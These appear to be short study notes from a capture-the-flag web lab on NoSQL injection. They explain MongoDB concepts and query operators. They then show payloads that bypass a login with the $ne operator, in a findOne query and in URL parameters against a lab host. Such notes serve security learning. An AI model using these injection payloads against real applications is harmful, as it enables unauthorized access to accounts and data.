# Day 7 - Web - NoSQL

## What is NoSQL
- A NoSQL database refers to a non-relational database that is short for non SQL and Not only SQL.
- Commonly used for big Data and IoT devices because they have fast queries, flexible and scalable.

## Understanding NoSQL
- Examples include MongoDB, Couchbase, RavenDB.
- *Collections* are similar to tables or views in MySQL and MSSQL.
- *Documents* are similar to rows or records in MySQL and MSSQL.
- *Fields* are similar to columns in MySQL and MSSQL.
- Query Operators:
	- `$and` equivalent to AND in MySQL
	- `$or` equivalent to OR in MySQL
	- `$eq` equivalent to = in MySQL

## NoSQL injection
- A web security vulnerability that allows the attacker to have control over the database. 
- Happens by sending queries via untrusted and unfiltered web application input, leading to leaked unauthorized information.

## Bypassing login pages

- Normal command:
 ```shell-session
db.users.findOne({username: "admin", password: "adminpass"})
```
- Bypass command:
```shell-session
db.users.findOne({username: "admin", password: {"$ne":"xyz"}})
```
- In urls:
```scheme
http://example.thm.labs/search?username=admin&role[$ne]=user
```
```scheme
http://example.thm.labs/search?username[$ne]=ben&role=user
```

